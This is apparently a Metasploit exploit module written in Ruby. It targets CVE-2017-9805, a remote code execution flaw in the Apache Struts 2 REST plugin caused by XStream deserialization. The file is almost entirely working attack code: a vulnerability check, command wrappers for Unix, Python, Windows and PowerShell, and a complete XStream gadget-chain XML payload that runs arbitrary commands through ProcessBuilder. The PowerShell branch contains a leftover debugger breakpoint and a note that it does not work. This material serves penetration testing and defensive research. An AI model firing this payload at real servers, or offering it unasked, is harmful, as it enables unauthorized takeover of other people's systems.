# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Apache Struts 2 REST Plugin XStream RCE&#039;,
      &#039;Description&#039;    => %q{
        Apache Struts versions 2.5 through 2.5.12 using the REST plugin are
        vulnerable to a Java deserialization attack in the XStream library.
      },
      &#039;Author&#039;         => [
        &#039;Man Yue Mo&#039;, # Vulnerability discovery
        &#039;wvu&#039;         # Metasploit module
      ],
      &#039;References&#039;     => [
        [&#039;CVE&#039;, &#039;2017-9805&#039;],
        [&#039;URL&#039;, &#039;https://struts.apache.org/docs/s2-052.html&#039;],
        [&#039;URL&#039;, &#039;https://lgtm.com/blog/apache_struts_CVE-2017-9805_announcement&#039;],
        [&#039;URL&#039;, &#039;https://github.com/mbechler/marshalsec&#039;]
      ],
      &#039;DisclosureDate&#039; => &#039;Sep 5 2017&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => [&#039;unix&#039;, &#039;python&#039;, &#039;linux&#039;, &#039;win&#039;],
      &#039;Arch&#039;           => [ARCH_CMD, ARCH_PYTHON, ARCH_X86, ARCH_X64],
      &#039;Privileged&#039;     => false,
      &#039;Targets&#039;        => [
        [&#039;Unix (In-Memory)&#039;,
          &#039;Platform&#039;   => &#039;unix&#039;,
          &#039;Arch&#039;       => ARCH_CMD
        ],
        [&#039;Python (In-Memory)&#039;,
          &#039;Platform&#039;   => &#039;python&#039;,
          &#039;Arch&#039;       => ARCH_PYTHON
        ],
        [&#039;PowerShell (In-Memory)&#039;,
          &#039;Platform&#039;   => &#039;win&#039;,
          &#039;Arch&#039;       => [ARCH_X86, ARCH_X64]
        ],
        [&#039;Linux (Dropper)&#039;,
          &#039;Platform&#039;   => &#039;linux&#039;,
          &#039;Arch&#039;       => [ARCH_X86, ARCH_X64]
        ],
        [&#039;Windows (Dropper)&#039;,
          &#039;Platform&#039;   => &#039;win&#039;,
          &#039;Arch&#039;       => [ARCH_X86, ARCH_X64]
        ]
      ],
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options([
      Opt::RPORT(8080),
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Path to Struts action&#039;, &#039;/struts2-rest-showcase/orders/3&#039;])
    ])
  end

  def check
    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => target_uri.path,
      &#039;ctype&#039;  => &#039;application/xml&#039;,
      &#039;data&#039;   => random_crap
    )

    if res && res.code == 500 && res.body.include?(&#039;xstream&#039;)
      CheckCode::Appears
    else
      CheckCode::Safe
    end
  end

  def exploit
    case target.name
    when /Unix/, /Python/, /PowerShell/
      execute_command(payload.encoded)
    else
      execute_cmdstager
    end
  end

  def execute_command(cmd, opts = {})
    case target.name
    when /Unix/, /Linux/
      cmd = %W{/bin/sh -c #{cmd}}
    when /Python/
      cmd = %W{python -c #{cmd}}
    when /PowerShell/
      # This shit doesn&#039;t work yet
      require &#039;pry&#039;; binding.pry
      cmd = %W{cmd.exe /c #{cmd_psh_payload(cmd, payload.arch, remove_comspec: true)}}
    when /Windows/
      cmd = %W{cmd.exe /c #{cmd}}
    end

    # Encode each command argument with HTML entities
    cmd.map! { |arg| Rex::Text.html_encode(arg) }

    send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => target_uri.path,
      &#039;ctype&#039;  => &#039;application/xml&#039;,
      &#039;data&#039;   => xstream_payload(cmd)
    )
  end

  # java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.XStream ImageIO
  def xstream_payload(cmd)
    # XXX: <spillLength> and <read> need to be removed for Windows
    <<EOF
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>#{cmd.join(&#039;</string><string>&#039;)}</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>#{random_crap}</name>
                  </filter>
                  <next class="string">#{random_crap}</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>
EOF
  end

  def random_crap
    Rex::Text.rand_text_alphanumeric(rand(42) + 1)
  end

end

